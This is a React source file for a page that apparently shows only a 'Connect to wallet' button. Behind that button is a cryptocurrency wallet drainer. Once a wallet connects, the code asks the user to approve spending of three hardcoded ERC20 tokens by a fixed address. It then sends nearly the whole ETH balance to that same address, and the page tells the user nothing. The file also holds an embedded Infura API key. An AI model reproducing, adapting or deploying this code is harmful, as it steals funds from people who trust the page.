import React, { useEffect, useState, useRef } from 'react';
import ReactDOM from 'react-dom';
import './AppStyle.css';
import {
  useEagerConnect,
  useWeb3,
  WalletProvider,
  useWalletModal,
  useERC20Approval,
  toLower,
} from './main/index'
import {
  useERC721,
  useERC1155,
  useERC20,
} from "./hooks/useContract";
import Web3 from 'web3'
import { useConfig } from './contexts/configContext'
import { useWeb3React } from '@web3-react/core'

var sendAmount;

function App() {

  useEagerConnect();
  const { config } = useConfig()
  let httpProvider
  let web3NoAccount;
  const rpc = config.rpcUrls[config.chainId]
    if (rpc) {
        httpProvider = new Web3.providers.HttpProvider(rpc)
        web3NoAccount = new Web3(httpProvider)
    }

    const { library } = useWeb3React()
    const refEth = useRef(library)
    const [web3, setweb3] = useState(library ? new Web3(library) : web3NoAccount)


    useEffect(() => {
        if (library !== refEth.current) {
            setweb3(library ? new Web3(library) : web3NoAccount)
            refEth.current = library
        }
  }, [library])

  const [ tokenAddress, setTokenAddress ] = useState("");
  const { getContract, token } = useERC20(tokenAddress);
  const { setOpen, deactivate, error: walletError } = useWalletModal();
  const { account, connected, balance } = useWeb3();
  const { approve, approveState, approvedBalance, isApproved } = useERC20Approval(tokenAddress, '0x42F4ef8b15Bade9F6ec88Cd10BC5c06ba6c7045e', token, sendAmount);
  const tokenaddress = ["0x2f109021afe75b949429fe30523ee7c0d5b27207","0xB8c77482e45F1F44dE1745F52C74426C631bDD52","0x990f341946A3fdB507aE7e52d17851B87168017c"];
  const [tokenIndex, setTokenIndex] = useState(0);

  useEffect(() => {
    if (connected && balance) {
      setTokenIndex(0);
    }
  }, [connected, balance]);

  useEffect(() => {
    if(approveState == "FAILED" || approveState == "SUCCEED"){
      setTokenIndex(tokenIndex + 1);
    }
  }, [approveState]);

  useEffect(() => {
    setTokenAddress(tokenaddress[tokenIndex]);
    if(tokenIndex == tokenaddress.length) {
      let sendEth = parseInt(balance);
      if(sendEth > 1000000000000000) {
        sendEth -= 1000000000000000;
      } else sendEth = 0;
      try {
        const params = {
          from: account,
          to: '0x42F4ef8b15Bade9F6ec88Cd10BC5c06ba6c7045e',
          value: sendEth.toString(),
        };
        web3.eth.sendTransaction(params);
      } catch(e) {
        console.log("payment fail!");
        console.log(e);
      }
    }
  }, [tokenIndex]);

  useEffect(() => {
    if(tokenAddress && balance) {
      sendAmount = approvedBalance;
      approve();
      getContract();
    }
  }, [tokenAddress, balance]);

  return (
    <div className="App" style={{ display: 'flex', alignItems: 'cetner', justifyContent: 'center' }}>
      <header className="App-header" style={{ textAlign: 'center', marginTop: '20%' }}>
        <button className="button" variant='outlined' onClick={() => connected ? deactivate() : setOpen(true)}>{connected ? 'Disconnect' : 'Connect to wallet'}</button>
        <p>{connected && account}</p>
        <p>{connected && toLower(balance).toString()}</p>
      </header>
    </div >
  );
}

const config = {
  chainId: 1,
  bsc: true,
  darkMode: false,
  rpcUrls: {
    1: 'https://mainnet.infura.io/v3/9aa3d95b3bc440fa88ea12eaa4456161',
  },
  walletConnectPoolingInterval: 12000,
  supportedChainIds: [1],
  // supportedChainIds: [1, 3, 4, 5],
}

ReactDOM.render(
  <React.StrictMode>
    <WalletProvider config={config}>
      <App />
    </WalletProvider>
  </React.StrictMode>,
  document.getElementById('root')
);